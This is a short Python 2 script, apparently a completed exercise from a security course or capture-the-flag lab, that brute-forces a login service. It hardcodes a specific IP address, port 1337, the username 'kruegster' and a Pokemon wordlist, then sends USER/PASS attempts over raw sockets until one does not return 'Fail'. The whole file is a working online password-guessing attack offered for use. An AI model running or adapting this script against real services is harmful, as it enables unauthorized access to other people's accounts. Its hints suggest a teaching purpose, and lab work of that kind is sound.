
import socket

host = "142.93.117.193" # IP address here
port = 1337 # Port here
wordlist = "/root/Desktop/pokemon.txt" # Point to wordlist file

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:
            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            Reading:
                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data
            Sending:
                s.send("something to send\n")   # Send a newline \n at the end of your command
        General idea:
            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            the Briong server.
    """



    passwordlist = open(wordlist,'r').read().splitlines()   # Hint: use wordlist

    for password in passwordlist:
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))

        username = "kruegster"  # Hint: use OSINT
        s.send('USER'+username+'\n')
        data = s.recv(1024)
        

        print 'trying ', password
        s.send('PASS'+password+'\n')
        data = s.recv(1024)
        print(data)
        if "Fail" in data:
            print'Failed '
        else:
            print 'Found password ',password



if __name__ == '__main__':
    brute_force()


